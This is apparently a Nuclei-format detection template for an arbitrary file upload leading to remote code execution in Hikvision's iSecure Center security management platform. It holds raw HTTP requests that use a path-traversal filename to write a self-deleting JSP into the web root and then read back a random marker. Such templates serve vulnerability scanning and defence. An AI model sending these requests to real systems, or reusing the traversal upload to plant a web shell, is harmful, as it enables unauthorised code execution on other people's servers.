id: hikvision-isecure-report-fileupload-rce

info:
  name: 海康威视综合安防管理平台 svm/api/external/report 任意文件上传
  author: Observer
  severity: critical
  description: |
    海康威视综合安防管理平台 /svm/api/external/report 可将 JSP 写入 els/static，回读随机标记验证代码执行。
    与仅探测接口 500 错误码的 hikvision-isecure-center-report-upload 不是同一验证深度。
  reference:
    - https://github.com/zan8in/afrog
    - https://github.com/PeiQi0/PeiQi-WIKI-Book
  tags: hikvision,isecure,fileupload,rce

variables:
  randstr: "{{rand_base(10)}}"
  marker: "{{rand_base(12)}}"

http:
  - raw:
      - |
        POST /svm/api/external/report HTTP/1.1
        Host: {{Hostname}}
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{randstr}}

        ------WebKitFormBoundary{{randstr}}
        Content-Disposition: form-data; name="file"; filename="../../../tomcat85linux64.1/webapps/els/static/{{randstr}}.jsp"
        Content-Type: application/zip

        <%out.print("{{marker}}");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
        ------WebKitFormBoundary{{randstr}}--
      - |
        GET /els/static/{{randstr}}.jsp HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: dsl
        dsl:
          - 'status_code_1 == 200 && status_code_2 == 200 && contains(body_2, marker)'
